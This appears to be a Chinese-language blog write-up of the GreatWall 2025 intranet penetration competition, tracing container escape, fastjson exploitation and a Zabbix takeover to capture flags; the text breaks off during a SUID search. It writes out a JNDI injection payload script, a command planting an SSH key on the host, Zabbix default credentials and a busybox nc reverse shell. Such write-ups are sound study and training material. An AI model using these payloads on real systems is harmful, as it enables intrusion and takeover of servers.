@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>GeatWall_2025 | 0raN9e&#39;s Blog</title>
+<meta name="keywords" content="docker, springboot, fastjson, 提权">
+<meta name="description" content="介绍
+本场景以内网常见服务为基础，构造了一套办公网络环境，你现在作为一名渗透工程师，你的任务是通过信息收集、权限提升、横向移动、服务利用等内网渗透技术，逐步获取场景内的4个flag作为你的成就目标进行提交
+正常先fscan扫一下内容
+[2025-10-10 12:57:33] [SUCCESS] 端口开放 8.130.128.178:80
+[2025-10-10 12:57:33] [SUCCESS] 端口开放 8.130.128.178:22
+[2025-10-10 12:57:33] [SUCCESS] 服务识别 8.130.128.178:22 =&gt; [ssh] 版本:8.9p1 Ubuntu 3ubuntu0.13 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13.]
+[2025-10-10 12:57:36] [SUCCESS] 端口开放 8.130.128.178:8080
+[2025-10-10 12:57:39] [SUCCESS] 服务识别 8.130.128.178:80 =&gt; [http]
+[2025-10-10 12:57:51] [SUCCESS] 服务识别 8.130.128.178:8080 =&gt; [http]
+[2025-10-10 12:57:51] [INFO] 存活端口数量: 3
+[2025-10-10 12:57:51] [INFO] 开始漏洞扫描
+[2025-10-10 12:57:52] [INFO] 加载的插件: ssh, webpoc, webtitle
+[2025-10-10 12:57:52] [SUCCESS] 网站标题 http://8.130.128.178      状态码:200 长度:10032  标题:政务服务平台 - 门户与办事大厅
+[2025-10-10 12:59:03] [SUCCESS] 目标: http://8.130.128.178:8080
+  漏洞名称: poc-yaml-spring-actuator-heapdump-file
+  详细信息: author:AgeloVito
+            links:https://www.cnblogs.com/wyb628/p/8567610.html
+[2025-10-10 12:59:07] [SUCCESS] 目标: http://8.130.128.178:8080
+  漏洞名称: poc-yaml-springboot-env-unauth
+  详细信息:
+            links:https://github.com/LandGrey/SpringBootVulExploit
+flag1
+有洞直接打
+
+可以直接检测到对应的cve啊，打个内存马进去
+简单的翻了翻没找到flag
+执行ls -al发现有文件.dockerenv
+
+尝试执行">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/%E6%B8%97%E9%80%8F/greatwall2025/greatwall_2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/%E6%B8%97%E9%80%8F/greatwall2025/greatwall_2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="0raN9e&#39;s Blog (Alt + H)">0raN9e&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/links/" title="友链">
+                    <span>友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      GeatWall_2025
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="介绍">介绍<a hidden class="anchor" aria-hidden="true" href="#介绍">#</a></h1>
+<p>本场景以内网常见服务为基础，构造了一套办公网络环境，你现在作为一名渗透工程师，你的任务是通过信息收集、权限提升、横向移动、服务利用等内网渗透技术，逐步获取场景内的4个flag作为你的成就目标进行提交
+正常先fscan扫一下内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 端口开放 8.130.128.178:80
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 端口开放 8.130.128.178:22
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 服务识别 8.130.128.178:22 <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>ssh<span style="color:#f92672">]</span> 版本:8.9p1 Ubuntu 3ubuntu0.13 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:<span style="color:#f92672">[</span>SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13.<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:36<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 端口开放 8.130.128.178:8080
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:39<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 服务识别 8.130.128.178:80 <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>http<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 服务识别 8.130.128.178:8080 <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>http<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> 存活端口数量: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> 开始漏洞扫描
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:52<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> 加载的插件: ssh, webpoc, webtitle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:57:52<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 网站标题 http://8.130.128.178      状态码:200 长度:10032  标题:政务服务平台 - 门户与办事大厅
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:59:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 目标: http://8.130.128.178:8080
+</span></span><span style="display:flex;"><span>  漏洞名称: poc-yaml-spring-actuator-heapdump-file
+</span></span><span style="display:flex;"><span>  详细信息: author:AgeloVito
+</span></span><span style="display:flex;"><span>            links:https://www.cnblogs.com/wyb628/p/8567610.html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-10 12:59:07<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> 目标: http://8.130.128.178:8080
+</span></span><span style="display:flex;"><span>  漏洞名称: poc-yaml-springboot-env-unauth
+</span></span><span style="display:flex;"><span>  详细信息:
+</span></span><span style="display:flex;"><span>            links:https://github.com/LandGrey/SpringBootVulExploit
+</span></span></code></pre></div><h1 id="flag1">flag1<a hidden class="anchor" aria-hidden="true" href="#flag1">#</a></h1>
+<p>有洞直接打
+<img alt="2025-10-10130045" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10130045.png">
+可以直接检测到对应的cve啊，打个内存马进去
+简单的翻了翻没找到flag
+执行ls -al发现有文件<code>.dockerenv</code>
+<img alt="2025-10-10130220" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10130220.png">
+尝试执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name core_pattern
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/proc/sys/kernel/core_pattern
+</span></span><span style="display:flex;"><span>/host/proc/sys/kernel/core_pattern
+</span></span></code></pre></div><p>挂载宿主机procfs逃逸这个漏洞，
+尝试gcc编译脚本发现环境里面libc不适配，使用cdk
+<a href="https://github.com/cdk-team/CDK">cdk-team/CDK: 📦 Make security testing of K8s, Docker, and Containerd easier.</a>
+发现大文件不能正常传输，分割传输上去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>split -b 100k cdk_linux_amd64_upx cdk.part.
+</span></span></code></pre></div><p>上传之后直接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat cdk.part.* &gt; cdk_linux
+</span></span><span style="display:flex;"><span>chmod +x ./cdk_linux
+</span></span><span style="display:flex;"><span>./cdk_linux evaluate --full
+</span></span><span style="display:flex;"><span>./cdk_linux run mount-procfs /host/proc/ <span style="color:#e6db74">&#34;mkdir /root/.ssh/&#34;</span>
+</span></span></code></pre></div><p>Syntax error: Unterminated quoted string。容易出现这个问题，注意一下格式
+之后把自己的上传上去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./cdk_linux run mount-procfs /host/proc/ <span style="color:#e6db74">&#39;echo ssh-rsa AAAAB3N4Y........8gFDoRl6pmw== root@kali &gt; /root/.ssh/authorized_keys&#39;</span>
+</span></span></code></pre></div><p>直接ssh登录拿到flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@platform:~# cat /flag
+</span></span></code></pre></div><h1 id="flag2">flag2<a hidden class="anchor" aria-hidden="true" href="#flag2">#</a></h1>
+<p>正常流程就是传fscan然后内网穿透工具
+看内网的ip</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@platform:~# ifconfig
+</span></span><span style="display:flex;"><span>docker0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+</span></span><span style="display:flex;"><span>        inet6 fe80::1443:54ff:fe45:d7ef  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span style="display:flex;"><span>        ether 16:43:54:45:d7:ef  txqueuelen <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">3679</span>  bytes <span style="color:#ae81ff">238067</span> <span style="color:#f92672">(</span>238.0 KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">5462</span>  bytes <span style="color:#ae81ff">7186092</span> <span style="color:#f92672">(</span>7.1 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eth0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        inet 172.16.22.12  netmask 255.255.255.0  broadcast 172.16.22.255
+</span></span><span style="display:flex;"><span>        inet6 fe80::216:3eff:fe04:7839  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span style="display:flex;"><span>        ether 00:16:3e:04:78:39  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">25139</span>  bytes <span style="color:#ae81ff">10649611</span> <span style="color:#f92672">(</span>10.6 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">26935</span>  bytes <span style="color:#ae81ff">2108965</span> <span style="color:#f92672">(</span>2.1 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>测试了一下应该是不出网,这里vshell正向上线</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp /home/orange/tcp_linux_amd64 root @8.130.128.178:/tmp
+</span></span></code></pre></div><p>之后上传fscan到机子里
+<img alt="2025-10-10133945" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10133945.png">
+上面那个<code>172.17.0.1</code>就只有本机的一些东西，没扫出有什么利用的东西，看一下下面一个(扫的时候等的时间有点长)
+<img alt="2025-10-10134749" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10134749.png"></p>
+<pre tabindex="0"><code>[2025-10-10 13:43:36] [SUCCESS] 目标 172.16.22.12    存活 (ICMP)
+[2025-10-10 13:43:36] [SUCCESS] 目标 172.16.22.14    存活 (ICMP)
+[2025-10-10 13:43:36] [SUCCESS] 目标 172.16.22.41    存活 (ICMP)
+[2025-10-10 13:43:36] [SUCCESS] 目标 172.16.22.88    存活 (ICMP)
+[2025-10-10 13:43:36] [SUCCESS] 目标 172.16.22.253   存活 (ICMP)
+</code></pre><pre tabindex="0"><code>172.16.22.41 DC:ZWFW\DC
+</code></pre><p><img alt="2025-10-10134930" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10134930.png"></p>
+<p>走个隧道
+访问<code>http://172.16.22.88/</code>直接下载apk
+<img alt="2025-10-10135143" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10135143.png">
+<img alt="2025-10-10135550" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10135550.png">
+猜测和8080有关，直接反编译看一下内容
+看组件应该是fastjson，主要发包的代码在com.example.mobile.MainActivity里</p>
+<ul>
+<li><strong><code>onCreate()</code></strong>：初始化界面并加载 Compose 组件；</li>
+<li><strong><code>LoginScreen()</code></strong>：定义一个登录界面的 UI；</li>
+<li><strong><code>sendLoginRequest()</code></strong>：负责发送登录请求到服务器并返回结果。
+接收三个参数：服务器地址、用户名和密码
+这里用的hony师傅的脚本，不太会逆向</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives <span style="color:#f92672">import</span> serialization, hashes  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives.asymmetric <span style="color:#f92672">import</span> padding  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives.ciphers <span style="color:#f92672">import</span> Cipher, algorithms, modes  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.backends <span style="color:#f92672">import</span> default_backend  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===== 配置信息 =====SERVER_URL = &#34;http://172.16.22.88:8080/api/login&#34;  </span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Java 代码中的 RSA 公钥（Base64 格式）  </span>
+</span></span><span style="display:flex;"><span>PUBLIC_KEY_B64 <span style="color:#f92672">=</span> (  
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqACjbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrztFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXvHVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpDL0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1uxm5ZQIDAQAB&#34;</span>  
+</span></span><span style="display:flex;"><span>)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===== 1. 要发送的 JSON 明文 =====plaintext = &#34;&#34;&#34;{  </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;@type&#34;</span>: <span style="color:#e6db74">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,    <span style="color:#e6db74">&#34;dataSourceName&#34;</span>: <span style="color:#e6db74">&#34;rmi://172.16.22.12:50388/f94022&#34;</span>,    <span style="color:#e6db74">&#34;autoCommit&#34;</span>: true}<span style="color:#e6db74">&#34;&#34;&#34;  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(plaintext)  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># ===== 2. 生成随机 AES key (128-bit) =====aes_key = os.urandom(16)  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># ===== 3. AES/GCM 加密 =====iv = os.urandom(12)  # 12 字节 IVencryptor = Cipher(  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    algorithms.AES(aes_key),  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    modes.GCM(iv),  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    backend=default_backend()  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">).encryptor()  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ciphertext = encryptor.update(plaintext.encode(&#34;utf-8&#34;)) + encryptor.finalize()  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tag = encryptor.tag  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Body = IV + 密文 + GCM tagbody_raw = iv + ciphertext + tag  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">body_b64 = base64.b64encode(body_raw).decode(&#34;utf-8&#34;)  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># ===== 4. 用 RSA 公钥加密 AES key =====pub_bytes = base64.b64decode(PUBLIC_KEY_B64)  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">public_key = serialization.load_der_public_key(pub_bytes, backend=default_backend())  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">enc_key = public_key.encrypt(  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    aes_key,  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    padding.PKCS1v15()  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">enc_key_b64 = base64.b64encode(enc_key).decode(&#34;utf-8&#34;)  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># ===== 5. 发送 POST 请求 =====headers = {  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;Content-Type&#34;: &#34;application/octet-stream&#34;,  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;X-Encrypted-Key&#34;: enc_key_b64,  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">resp = requests.post(SERVER_URL, data=body_b64.encode(&#34;utf-8&#34;), headers=headers, timeout=10)  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(&#34;Status:&#34;, resp.status_code)  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(&#34;Response:&#34;, resp.text)
+</span></span></span></code></pre></div><p>利用java-chains，把jdk和jar传到机子里面(vshell还挺简单传的)启动用fastjson的templateslmpl的bytecodeconvert里面打入内存马
+哥斯拉连接拿到flag
+<img alt="2025-10-10150535" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/2025-10-10150535.png"></p>
+<h1 id="flag3">flag3<a hidden class="anchor" aria-hidden="true" href="#flag3">#</a></h1>
+<p>对其他ip进行检索</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains4 dirsearch -u http://172.16.22.14
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:08:28<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    1KB - /zabbix/
+</span></span></code></pre></div><p>访问一下，网络检索一下默认的密码</p>
+<pre tabindex="0"><code>Admin/zabbix
+</code></pre><p>进入后台，在告警这里的脚本可以输入内容，我输出的是</p>
+<pre tabindex="0"><code>whoami;id
+</code></pre><p>在监测这里看最新数据这里有回显，打一个反弹shell</p>
+<pre tabindex="0"><code>zabbix
+uid=115(zabbix) gid=122(zabbix) groups=122(zabbix)
+</code></pre><p>打个反弹shell进去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>busybox nc 172.16.22.12 <span style="color:#ae81ff">5566</span> -e sh
+</span></span></code></pre></div><p>在入口机nc一下等待接收
+简单的提权拿到flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zabbix@zabbix:/$ cat flag.txt
+</span></span><span style="display:flex;"><span>cat flag.txt
+</span></span><span style="display:flex;"><span>cat: flag.txt: Permission denied
+</span></span><span style="display:flex;"><span>zabbix@zabbix:/$ find / -perm -4000 -type f -exec ls -la <span style="color:#f92672">{}</span> 2&gt;/dev/null <span style="color:#ae81ff">\;</span>
+</span></span><span style="display:flex;"><span>find / -perm -4000 -type f -exec ls -la <span style="color:#f92672">{}</span> 2&gt;/dev/null <span style="color:#ae81ff">\;</span>
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">30872</span> Feb <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> /usr/bin/pkexec
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">35200</span> Apr  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2024</span> /usr/bin/umount
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">72072</span> Feb  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> /usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">59976</span> Feb  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> /usr/bin/passwd
